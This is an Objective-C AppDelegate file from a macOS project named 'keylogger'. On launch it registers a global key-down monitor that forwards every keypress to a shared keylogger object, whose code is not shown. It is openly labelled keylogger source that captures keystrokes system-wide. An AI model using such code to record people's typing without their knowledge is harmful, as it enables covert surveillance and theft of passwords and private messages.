//
//  AppDelegate.m
//  keylogger
//
//  Created by Michael Colon on 7/15/16.
//  Copyright © 2016 Michael Colon. All rights reserved.
//

#import "AppDelegate.h"
#import "Keys.h"


@interface AppDelegate ()

@end

@implementation AppDelegate

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
//    [Keys sharedKeyLogger];
    NSLog(@"and here");
    //Notifications for key presses
    [NSEvent addGlobalMonitorForEventsMatchingMask:NSKeyDownMask
                                           handler:^ (NSEvent *event) {[[Keys sharedKeyLogger] handleKeyPress:event];}];
}


- (void)applicationWillTerminate:(NSNotification *)aNotification {
    // Insert code here to tear down your application
}

@end
